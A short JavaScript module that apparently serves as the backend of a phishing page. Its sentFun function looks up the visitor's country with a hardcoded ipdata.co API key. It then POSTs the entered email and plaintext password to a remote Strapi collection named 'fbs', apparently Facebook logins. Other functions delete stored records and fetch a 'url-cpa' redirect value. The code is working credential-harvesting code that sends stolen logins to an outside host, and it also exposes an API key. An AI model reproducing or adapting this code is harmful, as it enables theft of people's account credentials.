export async function sentFun(data) {

   //Obtiene el paise del visitante
     const respuesta =  await fetch('https://api.ipdata.co/?api-key=c22dac17d18fcac7cb03f866c5cc0874cef6a7b7ec1636d7fb39f5a5');
    const resultado = await respuesta.json();

    


   const api = await fetch("https://strapi-70ig.onrender.com/api/fbs", {
      method: "POST",
      headers: {
         Acept: "application/json",
         "Content-Type": "application/json",
      },
      body: JSON.stringify({
         data: {
            Email: `${data.email}`,
            pass: `${data.pass}`,
             "city":`${resultado.country_name}`
         },
      }),
   });

   return api.json();
}


export async function searchAndDelete(id){

   const res = await fetch(`http://192.168.2.75:1337/api/fbs/${id}`, {
      method: "DELETE",
      headers: {
        Acept: "application/json",
        "Content-Type": "application/json",
     }
   })
      .then((res) => res.json())
      .then((res) => {
         console.log(res);
      });

}

export async function getUrl(){
   const respuesta =  await fetch('http://192.168.2.75:1337/api/url-cpa');
   return  await respuesta.json();
  
}
